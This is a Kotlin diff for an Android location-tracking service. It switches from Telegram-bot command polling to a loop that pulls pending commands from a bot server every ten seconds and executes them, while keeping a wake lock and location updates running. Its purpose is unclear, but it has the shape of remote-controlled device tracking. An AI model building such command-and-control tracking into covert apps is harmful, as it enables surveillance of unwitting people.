@@ -61,7 +61,7 @@ class MainTrackerService : Service() {
         acquireWakeLock()
         startLocationUpdates()
         startBatteryMonitor()
-        startTelegramPolling()
+        startServerCommandPolling()
     }
 
     // ==================== ==================== ====================
@@ -159,16 +159,32 @@ class MainTrackerService : Service() {
     }
 
     // ==================== ==================== ====================
-    //         استطلاع الأوامر من تيليجرام (Telegram Polling)
+    //         استقبال الأوامر من السيرفر (بدون getUpdates)
     // ==================== ==================== ====================
 
-    private fun startTelegramPolling() {
+    private fun startServerCommandPolling() {
         serviceScope.launch(Dispatchers.IO) {
-            try {
-                TelegramDirectClient.startCommandPolling(this@MainTrackerService)
-                Log.d(TAG, "تم بدء استطلاع الأوامر من تيليجرام")
-            } catch (e: Exception) {
-                Log.e(TAG, "خطأ في بدء الاستطلاع: ${e.message}", e)
+            Log.d(TAG, "بدء استطلاع الأوامر من السيرفر (بدون getUpdates)...")
+            while (isActive) {
+                try {
+                    val deviceId = SharedPrefsManager.getDeviceId(this@MainTrackerService)
+                    if (deviceId != null) {
+                        val commands = BotServerClient.getPendingCommands(deviceId)
+                        if (commands.isNotEmpty()) {
+                            Log.d(TAG, "تم استلام ${commands.size} أوامر من السيرفر")
+                            for (cmd in commands) {
+                                try {
+                                    CommandExecutor.execute(this@MainTrackerService, cmd.command, cmd.params)
+                                } catch (e: Exception) {
+                                    Log.e(TAG, "خطأ في تنفيذ الأمر ${cmd.command}: ${e.message}")
+                                }
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "خطأ في استطلاع السيرفر: ${e.message}")
+                }
+                delay(10_000) // فحص كل 10 ثوان
             }
         }
     }
@@ -191,7 +207,7 @@ class MainTrackerService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "خطأ في إيقاف تحديث الموقع: ${e.message}")
         }
-        TelegramDirectClient.stopCommandPolling()
+        // TelegramDirectClient.stopCommandPolling() - لا حاجة، getUpdates معطّل
         wakeLock?.release()
         super.onDestroy()
     }
